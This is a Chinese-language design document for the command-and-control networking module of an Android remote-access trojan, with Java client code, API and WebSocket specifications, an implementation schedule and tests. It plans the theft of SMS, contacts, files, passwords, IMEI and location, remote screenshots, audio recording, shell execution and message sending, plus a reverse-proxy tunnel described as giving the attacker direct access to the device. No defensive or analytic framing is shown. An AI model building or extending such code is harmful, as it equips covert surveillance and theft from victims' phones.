# 模块 01：网络通信模块设计文档

> **模块名称**: Network Communication Module
> **优先级**: P0（极高）
> **依赖**: 无
> **版本**: 1.0
> **日期**: 2026-03-16

---

## 一、模块概述

### 1.1 功能描述

网络通信模块是整个系统的核心基础设施，负责客户端与服务器之间的所有数据交互。采用三层通信架构，支持数据上传、实时命令推送和反向代理。

### 1.2 三层架构

```
Layer 1: HTTP/HTTPS
  ├─ 用途: 数据上传（短信/联系人/文件/密码）
  ├─ 协议: HTTP/1.1 over TLS 1.3
  └─ 库: OkHttp 4.12.0

Layer 2: WebSocket
  ├─ 用途: 实时命令推送（截图/录音/控制）
  ├─ 协议: WebSocket over TLS 1.3
  ├─ 心跳: 30 秒间隔
  └─ 库: OkHttp WebSocket

Layer 3: FRP 反向代理（可选）
  ├─ 用途: 攻击者直接访问设备
  ├─ 本地服务器: 127.0.0.1:8080
  └─ 库: FRP 官方客户端
```

---

## 二、技术规格

### 2.1 HTTP 客户端配置

**基于**: `com/guard/wallet/http/i.java`

```java
public class HttpClient {
    private OkHttpClient client;

    public HttpClient() {
        client = new OkHttpClient.Builder()
            // 超时配置
            .connectTimeout(60, TimeUnit.SECONDS)
            .readTimeout(120, TimeUnit.SECONDS)
            .writeTimeout(120, TimeUnit.SECONDS)
            .callTimeout(240, TimeUnit.SECONDS)

            // 连接配置
            .retryOnConnectionFailure(true)
            .followRedirects(true)
            .followSslRedirects(true)
            .pingInterval(30, TimeUnit.SECONDS)

            // TLS 1.3 支持
            .sslSocketFactory(
                Conscrypt.newProvider().getSSLContext().getSocketFactory(),
                trustManager
            )

            // 拦截器
            .addInterceptor(new AuthInterceptor())
            .addInterceptor(new LoggingInterceptor())

            .build();
    }
}
```

### 2.2 超时配置

| 超时类型 | 时长 | 说明 |
|---------|------|------|
| connectTimeout | 60 秒 | 建立 TCP 连接的最大时间 |
| readTimeout | 120 秒 | 读取响应数据的最大时间 |
| writeTimeout | 120 秒 | 发送请求数据的最大时间 |
| callTimeout | 240 秒 | 整个请求的最大时间 |
| pingInterval | 30 秒 | WebSocket 心跳间隔 |

### 2.3 TLS 配置

**TLS 版本**: TLS 1.3
**Provider**: Conscrypt 2.5.2
**证书验证**: 自定义 TrustManager（可选择绕过）

```java
// 启用 Conscrypt 支持 TLS 1.3
Security.insertProviderAt(Conscrypt.newProvider(), 1);
```

---

## 三、HTTP API 设计

### 3.1 设备注册

**端点**: `POST /api/v1/device/register`

**请求头**:
```http
Content-Type: application/json
X-App-Version: 1.0.0
```

**请求体**:
```json
{
  "deviceId": "790694236383350784",
  "model": "Xiaomi 12",
  "androidVersion": "13",
  "manufacturer": "Xiaomi",
  "imei": "***",
  "phoneNumber": "***"
}
```

**响应**:
```json
{
  "code": 200,
  "message": "success",
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "wsUrl": "wss://api.example.com/bridge",
    "deviceId": "790694236383350784"
  }
}
```

### 3.2 数据上传

**端点**: `POST /api/v1/data/upload`

**请求头**:
```http
Content-Type: application/json
Authorization: Bearer {token}
X-Device-ID: {deviceId}
```

**请求体**:
```json
{
  "type": "sms|contacts|files|passwords",
  "timestamp": 1710604800000,
  "data": {
    // 根据 type 不同，结构不同
  }
}
```

**响应**:
```json
{
  "code": 200,
  "message": "success",
  "data": {
    "uploaded": true,
    "id": "123456"
  }
}
```

---

## 四、WebSocket 协议设计

### 4.1 连接建立

**URL**: `wss://api.example.com/bridge`

**请求头**:
```http
Authorization: Bearer {token}
X-Device-ID: {deviceId}
Sec-WebSocket-Version: 13
```

### 4.2 消息格式

**客户端 → 服务器**:
```json
{
  "type": 1,
  "deviceId": "790694236383350784",
  "timestamp": 1710604800000,
  "body": {}
}
```

**服务器 → 客户端**:
```json
{
  "type": 10,
  "commandId": "cmd_123456",
  "body": {
    "bridgePath": "/cacheTask",
    "toDesktop": true,
    "buffer": "base64_encoded_data"
  }
}
```

### 4.3 消息类型定义

| type | 方向 | 名称 | 说明 |
|------|------|------|------|
| 1 | C→S | HEARTBEAT | 心跳（30 秒间隔） |
| 2 | C→S | STATUS_REPORT | 状态上报 |
| 3 | C→S | COMMAND_RESPONSE | 命令执行结果 |
| 10 | S→C | SCREENSHOT | 截图命令 |
| 11 | S→C | RECORD_AUDIO | 录音命令 |
| 12 | S→C | DOWNLOAD_FILE | 文件下载命令 |
| 13 | S→C | UPLOAD_FILE | 文件上传命令 |
| 14 | S→C | EXECUTE_SHELL | Shell 命令执行 |
| 15 | S→C | SEND_MESSAGE | 发送短信/消息 |

### 4.4 心跳机制

**客户端每 30 秒发送**:
```json
{
  "type": 1,
  "deviceId": "790694236383350784",
  "timestamp": 1710604800000,
  "body": {
    "battery": 85,
    "network": "WiFi",
    "location": "39.9042,116.4074"
  }
}
```

**服务器响应**:
```json
{
  "type": 1,
  "code": 200,
  "message": "pong"
}
```

---

## 五、类设计

### 5.1 NetworkManager

```java
package com.vendor.rat.network;

public class NetworkManager {
    private static NetworkManager instance;
    private HttpClient httpClient;
    private WebSocketClient wsClient;
    private String deviceToken;
    private String deviceId;

    public static NetworkManager getInstance() {
        if (instance == null) {
            synchronized (NetworkManager.class) {
                if (instance == null) {
                    instance = new NetworkManager();
                }
            }
        }
        return instance;
    }

    public void init(Context context) {
        deviceId = DeviceUtils.getDeviceId(context);
        httpClient = new HttpClient(context);
        wsClient = new WebSocketClient(context);
    }

    public void registerDevice(DeviceInfo info, Callback callback) {
        httpClient.post("/api/v1/device/register", info, new Callback() {
            @Override
            public void onSuccess(RegisterResponse response) {
                deviceToken = response.token;
                connectWebSocket(response.wsUrl);
                callback.onSuccess(response);
            }

            @Override
            public void onError(Exception e) {
                callback.onError(e);
            }
        });
    }

    public void connectWebSocket(String url) {
        wsClient.connect(url, deviceToken, new WebSocketListener() {
            @Override
            public void onMessage(String message) {
                handleWebSocketMessage(message);
            }
        });
    }

    public void uploadData(String type, Object data, Callback callback) {
        UploadRequest request = new UploadRequest(type, data);
        httpClient.post("/api/v1/data/upload", request, callback);
    }

    private void handleWebSocketMessage(String message) {
        Message msg = new Gson().fromJson(message, Message.class);

        switch (msg.type) {
            case 10: // SCREENSHOT
                CommandDispatcher.handleScreenshot(msg);
                break;
            case 11: // RECORD_AUDIO
                CommandDispatcher.handleRecordAudio(msg);
                break;
            case 15: // SEND_MESSAGE
                CommandDispatcher.handleSendMessage(msg);
                break;
        }
    }
}
```

### 5.2 HttpClient

```java
package com.vendor.rat.network;

public class HttpClient {
    private OkHttpClient client;
    private String baseUrl;
    private String deviceToken;
    private Context context;

    public HttpClient(Context context) {
        this.context = context;
        this.baseUrl = BuildConfig.API_BASE_URL;

        // 启用 Conscrypt 支持 TLS 1.3
        Security.insertProviderAt(Conscrypt.newProvider(), 1);

        client = new OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .readTimeout(120, TimeUnit.SECONDS)
            .writeTimeout(120, TimeUnit.SECONDS)
            .callTimeout(240, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .followRedirects(true)
            .followSslRedirects(true)
            .pingInterval(30, TimeUnit.SECONDS)
            .addInterceptor(new AuthInterceptor())
            .build();
    }

    public void post(String endpoint, Object data, Callback callback) {
        String json = new Gson().toJson(data);
        RequestBody body = RequestBody.create(
            json, MediaType.parse("application/json"));

        Request request = new Request.Builder()
            .url(baseUrl + endpoint)
            .addHeader("Authorization", "Bearer " + deviceToken)
            .addHeader("X-Device-ID", DeviceUtils.getDeviceId(context))
            .addHeader("X-App-Version", BuildConfig.VERSION_NAME)
            .post(body)
            .build();

        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onResponse(Call call, Response response) {
                try {
                    String responseBody = response.body().string();
                    callback.onSuccess(responseBody);
                } catch (IOException e) {
                    callback.onError(e);
                }
            }

            @Override
            public void onFailure(Call call, IOException e) {
                callback.onError(e);
            }
        });
    }

    public void setDeviceToken(String token) {
        this.deviceToken = token;
    }
}
```

### 5.3 WebSocketClient

```java
package com.vendor.rat.network;

public class WebSocketClient {
    private OkHttpClient client;
    private WebSocket webSocket;
    private Handler heartbeatHandler;
    private String deviceToken;
    private Context context;
    private WebSocketListener listener;

    public WebSocketClient(Context context) {
        this.context = context;
        this.heartbeatHandler = new Handler(Looper.getMainLooper());

        client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.SECONDS) // 无限制
            .pingInterval(30, TimeUnit.SECONDS)
            .build();
    }

    public void connect(String url, String token, WebSocketListener listener) {
        this.deviceToken = token;
        this.listener = listener;

        Request request = new Request.Builder()
            .url(url)
            .addHeader("Authorization", "Bearer " + token)
            .addHeader("X-Device-ID", DeviceUtils.getDeviceId(context))
            .build();

        webSocket = client.newWebSocket(request, new okhttp3.WebSocketListener() {
            @Override
            public void onOpen(WebSocket ws, Response response) {
                startHeartbeat();
                if (listener != null) {
                    listener.onConnected();
                }
            }

            @Override
            public void onMessage(WebSocket ws, String text) {
                if (listener != null) {
                    listener.onMessage(text);
                }
            }

            @Override
            public void onFailure(WebSocket ws, Throwable t, Response response) {
                stopHeartbeat();
                if (listener != null) {
                    listener.onError(t);
                }
                // 重连逻辑
                reconnect();
            }

            @Override
            public void onClosed(WebSocket ws, int code, String reason) {
                stopHeartbeat();
                if (listener != null) {
                    listener.onClosed();
                }
            }
        });
    }

    private void startHeartbeat() {
        heartbeatHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendHeartbeat();
                heartbeatHandler.postDelayed(this, 30000); // 30 秒
            }
        }, 30000);
    }

    private void stopHeartbeat() {
        heartbeatHandler.removeCallbacksAndMessages(null);
    }

    private void sendHeartbeat() {
        Message msg = new Message();
        msg.type = 1; // HEARTBEAT
        msg.deviceId = DeviceUtils.getDeviceId(context);
        msg.timestamp = System.currentTimeMillis();
        msg.body = new HeartbeatBody();
        msg.body.battery = getBatteryLevel();
        msg.body.network = getNetworkType();
        msg.body.location = getLocation();

        send(new Gson().toJson(msg));
    }

    public void send(String message) {
        if (webSocket != null) {
            webSocket.send(message);
        }
    }

    public void disconnect() {
        stopHeartbeat();
        if (webSocket != null) {
            webSocket.close(1000, "Normal closure");
        }
    }

    private void reconnect() {
        // 延迟 5 秒后重连
        heartbeatHandler.postDelayed(() -> {
            // 重新连接逻辑
        }, 5000);
    }

    private int getBatteryLevel() {
        // 获取电量
        return 85;
    }

    private String getNetworkType() {
        // 获取网络类型
        return "WiFi";
    }

    private String getLocation() {
        // 获取位置
        return "39.9042,116.4074";
    }
}
```

---

## 六、数据模型

### 6.1 Message

```java
public class Message {
    public int type;
    public String deviceId;
    public long timestamp;
    public Object body;
}
```

### 6.2 DeviceInfo

```java
public class DeviceInfo {
    public String deviceId;
    public String model;
    public String androidVersion;
    public String manufacturer;
    public String imei;
    public String phoneNumber;
}
```

### 6.3 UploadRequest

```java
public class UploadRequest {
    public String type;
    public long timestamp;
    public Object data;

    public UploadRequest(String type, Object data) {
        this.type = type;
        this.timestamp = System.currentTimeMillis();
        this.data = data;
    }
}
```

---

## 七、实施计划

### Phase 1: HTTP 客户端（3 天）

- [ ] HttpClient 基础实现
- [ ] TLS 1.3 配置
- [ ] 请求/响应拦截器
- [ ] 错误处理和重试
- [ ] 单元测试

### Phase 2: WebSocket 客户端（4 天）

- [ ] WebSocketClient 基础实现
- [ ] 心跳机制
- [ ] 重连逻辑
- [ ] 消息分发
- [ ] 单元测试

### Phase 3: NetworkManager（2 天）

- [ ] 单例模式实现
- [ ] 设备注册流程
- [ ] 数据上传流程
- [ ] 命令分发
- [ ] 集成测试

### Phase 4: FRP 客户端（可选，3 天）

- [ ] FRP 配置
- [ ] 本地 HTTP 服务器
- [ ] 反向代理隧道
- [ ] 测试

**总计**: 9-12 天

---

## 八、测试用例

### 8.1 HTTP 测试

```java
@Test
public void testDeviceRegister() {
    DeviceInfo info = new DeviceInfo();
    info.deviceId = "test_device_123";
    info.model = "Xiaomi 12";

    httpClient.post("/api/v1/device/register", info, new Callback() {
        @Override
        public void onSuccess(String response) {
            RegisterResponse res = new Gson().fromJson(response, RegisterResponse.class);
            assertNotNull(res.token);
            assertNotNull(res.wsUrl);
        }
    });
}
```

### 8.2 WebSocket 测试

```java
@Test
public void testWebSocketConnection() {
    wsClient.connect("wss://api.example.com/bridge", "test_token", new WebSocketListener() {
        @Override
        public void onConnected() {
            assertTrue(true);
        }

        @Override
        public void onMessage(String message) {
            assertNotNull(message);
        }
    });
}
```

---

## 九、依赖库

```gradle
dependencies {
    // OkHttp
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'

    // Conscrypt (TLS 1.3)
    implementation 'org.conscrypt:conscrypt-android:2.5.2'

    // Gson
    implementation 'com.google.code.gson:gson:2.10.1'

    // 测试
    testImplementation 'junit:junit:4.13.2'
    testImplementation 'org.mockito:mockito-core:5.3.1'
}
```

---

## 十、验收标准

| 功能 | 验收标准 |
|------|---------|
| HTTP 通信 | 成功上传数据，响应时间 < 2 秒 |
| WebSocket 通信 | 心跳稳定，命令响应时间 < 1 秒 |
| 重连机制 | 断线后 5 秒内自动重连 |
| TLS 1.3 | 成功建立 TLS 1.3 连接 |
| 错误处理 | 网络错误时正确重试 |

---

**文档版本**: 1.0
**最后更新**: 2026-03-16
**负责人**: 网络通信组
